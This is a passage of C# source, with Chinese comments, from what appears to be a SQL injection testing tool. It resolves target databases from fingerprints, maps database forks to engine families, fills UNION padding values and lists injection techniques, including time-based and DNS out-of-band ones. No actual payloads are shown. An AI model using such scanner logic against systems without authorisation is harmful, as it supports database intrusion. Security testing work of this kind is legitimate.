            DBType target = DbmsNameToDbType(test.Dbms);
            if (candidates.Count > 0 && target != DBType.UnKnow)
            {
                return candidates.Any(c => c == target || CompatDb(c) == target);
            }
            return true;
        }

        /// <summary>
        /// 解析数据库：优先用例自带dbms（与指纹候选兼容时以候选国产库为准），否则用错误指纹候选
        /// </summary>
        private static DBType ResolveDb(PayloadTest test, Ctx ctx)
        {
            DBType db = DbmsNameToDbType(test.Dbms);
            //国产库指纹优先：达梦/金仓指纹误报率低，而用例库无国产库专用用例，
            //指纹命中国产库时直接以国产库为准，保证后续取数用国产库模板（DM兼容Oracle、金仓兼容PG）
            foreach (DBType c in ctx.DbCandidates)
            {
                if (c == DBType.DM || c == DBType.Kingbase)
                {
                    return c;
                }
            }
            if (db != DBType.UnKnow)
            {
                //用例是Oracle/PG而指纹是达梦/金仓时，以国产库为准，保证后续取数用国产库模板；无匹配候选时沿用用例库
                foreach (DBType c in ctx.DbCandidates)
                {
                    if (c == db || CompatDb(c) == db)
                    {
                        return c;
                    }
                }
                return db;
            }
            if (ctx.DbCandidates.Count > 0)
            {
                return ctx.DbCandidates[0];
            }
            return db;
        }

        /// <summary>
        /// Union填充字符解析：NULL / [CHAR]随机字符串 / [RANDNUM]随机数字
        /// </summary>
        private static string? ResolveUnionChar(PayloadTest test, PayloadPlaceholder ph)
        {
            string c = test.RequestChar ?? "";
            if (string.IsNullOrWhiteSpace(c) || c.Equals("NULL", StringComparison.OrdinalIgnoreCase))
            {
                return "NULL";
            }
            if (c.Contains("[CHAR]", StringComparison.Ordinal))
            {
                return "'" + ph.RandStr + "'";
            }
            if (c.Contains("[RANDNUM]", StringComparison.Ordinal))
            {
                return ph.RandNum.ToString();
            }
            return ph.Replace(c);
        }

        /// <summary>
        /// fork/衍生库名（归一化后）→ 本工具技术族。
        /// fork库与主库注入技术一致（MariaDB/TiDB用MySQL用例，CockroachDB用PG用例等）
        /// </summary>
        private static readonly Dictionary<string, DBType> ForkToFamily = new Dictionary<string, DBType>
        {
            //MySQL族
            { "mariadb", DBType.MySQL }, { "percona", DBType.MySQL }, { "drizzle", DBType.MySQL },
            { "tidb", DBType.MySQL }, { "doris", DBType.MySQL }, { "starrocks", DBType.MySQL }, { "memsql", DBType.MySQL },
            //PostgreSQL族
            { "cockroachdb", DBType.PostgreSQL }, { "yugabytedb", DBType.PostgreSQL }, { "cratedb", DBType.PostgreSQL },
            //openGauss登记为PG的fork，本工具有独立枚举与模板
            { "opengauss", DBType.OpenGauss }
        };

        /// <summary>
        /// DBMS名称 → V2数据库类型（归一化后双向包含匹配，兼容"Microsoft SQL Server"与"SQLServer"等写法）
        /// </summary>
        private static DBType DbmsNameToDbType(string name)
        {
            if (string.IsNullOrWhiteSpace(name))
            {
                return DBType.UnKnow;
            }
            string n = NormDbName(name);
            //归一化后过短的名称（如中文文件名被剥成"2"）不参与包含匹配，避免"db2".Contains("2")式误判
            if (n.Length < 2)
            {
                return DBType.UnKnow;
            }
            //fork/衍生库精确映射优先（如mariadb→MySQL，防止包含匹配落空或错配）
            if (ForkToFamily.TryGetValue(n, out DBType fork))
            {
                return fork;
            }
            foreach (KeyValuePair<DBType, string> kv in V2ToDbmsName)
            {
                string m = NormDbName(kv.Value);
                if (n.Contains(m, StringComparison.Ordinal) || m.Contains(n, StringComparison.Ordinal))
                {
                    return kv.Key;
                }
            }
            return DBType.UnKnow;
        }

        private static DBType ParseDbName(string name)
        {
            if (Enum.TryParse(name, true, out DBType db))
            {
                return db;
            }
            return DbmsNameToDbType(name);
        }

        private static string NormDbName(string name)
        {
            return Regex.Replace(name ?? "", "[^a-z0-9]", "", RegexOptions.IgnoreCase).ToLowerInvariant();
        }

        private static string TechniqueName(int stype)
        {
            return stype switch
            {
                1 => "布尔盲注",
                2 => "报错注入",
                3 => "内联查询",
                4 => "堆叠查询",
                5 => "时间盲注",
                6 => "Union查询",
                7 => "DNS外带探测",
                _ => "未知技术"
            };
        }
    }
}
